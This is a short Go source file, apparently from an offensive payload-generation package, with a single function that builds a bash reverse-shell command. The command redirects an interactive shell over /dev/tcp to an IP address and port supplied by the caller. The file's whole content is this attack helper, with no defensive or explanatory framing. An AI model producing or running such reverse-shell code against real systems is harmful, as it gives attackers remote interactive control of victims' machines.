package payloads

func BashReverseShell(ip, port string) string {
	return "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1"
}
